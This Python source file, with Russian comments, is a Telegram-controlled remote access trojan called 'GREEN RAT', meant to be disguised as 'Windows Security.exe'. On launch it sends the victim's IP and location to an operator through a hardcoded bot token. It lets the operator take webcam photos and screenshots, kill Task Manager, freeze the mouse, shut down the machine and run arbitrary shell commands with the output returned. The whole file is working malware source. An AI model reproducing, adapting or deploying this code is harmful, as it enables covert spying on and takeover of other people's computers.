import telebot  # Библиотека для создания Telegram бота
import requests  # Библиотека для get/post запросов
import os  # Библиотека для работы с системой
import subprocess  # Библиотека для работы с системными командами
import cv2  # Библиотека для фото с веб-камеры
import time
import psutil
from PIL import ImageGrab  # Модуль для скриншотов экрана
from datetime import datetime  # Модуль времени
from os import system  # Библиотека для выполнения системных команд
import pyautogui

attemps = 60 # Количество попыток переподключения

for i in range(attemps):
    try:
        token = '6749759585:AAHF-QHBa9DIuSTq3mUS3kj74q42M2yjtYg'  # Токен бота
        user_id = '948363052'  # user_id ТГ
        exe_name = 'Windows Security.exe'  # Будущее имя EXE файла

        def taskmgr_terminate(): # Блокируем диспетчер задач
            while True:
                for proc in psutil.process_iter():
                    if proc.name().lower() == 'taskmgr.exe':
                        proc.terminate()

        def block_mouse(): # Блокируем мышь
            # Получаем текущие координаты курсора мыши
            original_position = pyautogui.position()
            
            # Отключаем fail-safe
            pyautogui.FAILSAFE = False
            
            # Бесконечно перемещаем курсор мыши в одну и ту же точку
            while True:
                pyautogui.moveTo(original_position)

        def new_target():
            country = '-'
            region = '-'
            city = '-'
            timezone = '-'
            zipcode = '-'
            loc = '-'
            target_ip = requests.get('https://ip.42.pl/raw').text  # Получаем IP
            url = 'https://ipinfo.io/' + target_ip + '/json'  # URL для информации по IP
            json = requests.get(url).json()  # Получаем json из содержимого страницы
            # Далее, просто проверяем наличие чего-то, если есть, то записываем в переменную
            if 'country' in json:
                country = json['country']
            if 'region' in json:
                region = json['region']
            if 'city' in json:
                city = json['city']
            if 'timezone' in json:
                timezone = json['timezone']
            if 'postal' in json:
                zipcode = json['postal']
            if 'loc' in json:
                loc = json['loc']
            target_date = datetime.today().strftime('%Y-%m-%d')  # Дата у пользователя
            target_time = datetime.today().strftime('%H:%M')  # Время у пользователя
            # Формируем сообщение для отправки ботом
            new_target_message = 'Пользователь включил РАТник!\n\nIP: ' + target_ip + '\nCountry: ' + country
            new_target_message += '\nRegion: ' + region + '\nCity: ' + city + '\nTimeZone: ' + timezone
            new_target_message += '\nZipCode: ' + zipcode + '\nLocation: ' + loc
            new_target_message += '\nDate: ' + str(target_date) + '\nTime: ' + str(target_time)
            # Отправляем сообщение
            bot.send_message(user_id, new_target_message)


        bot = telebot.TeleBot(token)  # Создание самого бота

        new_target()  # Запуск функции для новой цели

        # Если была введена команда /start или /help или /back
        @bot.message_handler(commands=['start', 'back'])
        def start_message(message):
            if str(message.chat.id) == user_id:  # Если id пользователя = id админа
                keyboard = telebot.types.ReplyKeyboardMarkup()  # Создаём клавиатуру
                # Добавляем кнопки к клавиатуре
                keyboard.add('Получить IP', 'Скриншот Экрана')
                keyboard.add('Фото с Камеры', 'Сообщение')
                keyboard.add('Выключить Компьютер', 'Перезагрузить Компьютер')
                keyboard.add('Заблокировать диспетчер задач', 'Заблокировать мышь')
                keyboard.add('/help')
                # Бот отправляет сообщение с клавиатурой
                bot.send_message(user_id, 'Hello!\nIm GREEN RAT\n\nAuthor: @Rexijoo\nChannel: @greencode_tg', reply_markup=keyboard)
            else:  # Если id пользователя не = id админа
                bot.send_message(message.chat.id, 'Извини, но это сообщение не для тебя :)')


        # Если была введена команда /help
        @bot.message_handler(commands=['help'])
        def help_message(message):
            if str(message.chat.id) == user_id:  # Если id пользователя = id админа
                help_mess = '''Нажмите на кнопки, чтобы выполнить команды.
        Если введёте ту команду, которой нет, то она выполнится в консоли.'''
                bot.send_message(user_id, help_mess)  # Бот отправляет help текст
            else:  # Если id пользователя не = id админа
                # Бот говорит, что это сообщение не для тебя
                bot.send_message(message.chat.id, 'Извини, но это сообщение не для тебя :)')


        # Если была введена команда /help
        @bot.message_handler(commands=['help'])
        def help_message(message):
            if str(message.chat.id) == user_id:  # Если id пользователя = id админа
                help_mess = '''Нажмите на кнопки, чтобы выполнить команды.
                Если введёте ту команду, которой нет, то она выполнится в консоли.'''
                bot.send_message(user_id, help_mess)  # Бот отправляет help текст
            else:  # Если id пользователя не = id админа
                # Бот говорит, что этот бот не для тебя
                bot.send_message(message.chat.id, 'Извини, но этот бот не для тебя :)')


        # Если было отправлено просто текст
        @bot.message_handler(content_types=['text'])
        def text_message(message):
            if str(message.chat.id) == user_id:  # Если id пользователя = id админа
                if message.text == 'Получить IP':  # Если текст = Получить IP
                    # Берём IP пользователя
                    target_ip = requests.get('https://ip.42.pl/raw').text
                    # Отправляем пользователю IP
                    bot.send_message(user_id, target_ip)
                    # Берём json из ссылки информации по IP
                    json = requests.get('https://ipinfo.io/' + target_ip + '/json').json()
                    # Если локация есть в json'е, то
                    if 'loc' in json:
                        loc = json['loc']  # Записываем локацию в переменную
                        loc = loc.split(',')  # Разделяем локацию по запятым
                        # Отправляем локацию пользователя в виде GoogleMaps
                        bot.send_location(user_id, float(loc[0]), float(loc[1]))
                elif message.text == 'Фото с Камеры':
                    try:  # Пытаемся получить фото с камеры
                        # Включаем основную камеру
                        cam = cv2.VideoCapture(0)
                        # "Прогреваем" камеру, чтобы снимок не был тёмным
                        for _ in range(100):
                            cam.read()
                        # Делаем снимок
                        s, img = cam.read()
                        # Сохраняем снимок
                        cv2.imwrite('img.bmp', img)
                        # Выключаем камеру
                        cam.release()
                        # Отправляем снимок
                        cam_img = open('img.bmp', 'rb')
                        # Отправляем пользователю снимок
                        bot.send_photo(user_id, cam_img)
                        # Закрываем и удаляем снимок
                        cam_img.close()
                        os.remove('img.bmp')
                    except:  # Если произошла ошибка
                        bot.send_message(user_id, 'Ошибка! У пользователя нет камеры!')
                elif message.text == 'Скриншот Экрана':  # Если текст = Скриншот Экрана, то...
                    # Делаем скриншот
                    screen = ImageGrab.grab()  # Бот отправляет скриншот
                    bot.send_photo(user_id, screen)
                elif message.text == 'Заблокировать диспетчер задач':
                    # Блокируем диспетчер задач
                    bot.send_message(user_id, 'Диспетчер задач заблокирован!')
                    taskmgr_terminate()
                elif message.text == 'Заблокировать мышь':
                    bot.send_message(user_id, 'Мышь заблокирована!')
                    block_mouse()
                elif message.text.startswith('Сообщение'):  # Если текст начинается с "Сообщение"
                    if message.text == 'Сообщение' or (
                            len(message.text) > 9 and message.text[9] != ' '):  # Если текст = Сообщение
                        bot.send_message(user_id,
                                        'Вы должны написать так - Сообщение <Текст>\nПример: Сообщение From GREEN CODE')
                    else:  # Если текст не = Сообщение
                        try:  # Попробуем отправить сообщение и сделать скриншот
                            # Делаем сообщение из команды пользователя
                            message = message.text.replace('Сообщение ', '')
                            command = 'msg * ' + message
                            # Отправляем сообщение
                            os.system(command)
                            # Делаем скриншот
                            screen = ImageGrab.grab()
                            # Отправляем сообщение и текст
                            bot.send_message(user_id, 'Готово!')
                            bot.send_photo(user_id, screen)
                        except:  # Если произошла ошибка...
                            bot.send_message(user_id, 'Неизвестная ошибка!')
                elif message.text == 'Выключить Компьютер':  # Если текст = Выключить Компьютер
                    bot.send_message(user_id, 'Компьютер выключен!\nБот не будет работать')
                    os.system('shutdown /s /t 1')  # Команда для выключения компьютера
                elif message.text == 'Перезагрузить Компьютер':  # Если текст = Перезагрузить Компьютер
                    bot.send_message(user_id, 'Компьютер перезагружается...')
                    os.system('shutdown /r /t 1')  # Команда для перезагрузки компьютера
                else:  # Если текст != командам, то текст выполняется в консоли
                    try:  # Пытаемся выполнить и отправить текст
                        output = subprocess.check_output(message.text, shell=True)
                        output = str(output)
                        output = output[2:]
                        output = output[:-1]
                        bot.send_message(user_id, output)
                    except:  # Если произошла ошибка
                        pass  # Заглушка
            else:  # Если id пользователя != id админа, то...
                # Бот говорит, что этот бот не для тебя
                bot.send_message(message.chat.id, 'Извини, но этот бот не для тебя :)')

        bot.polling(none_stop=True, interval=0, timeout=30)  # Запуск бота
        break
    except:
        time.sleep(10)
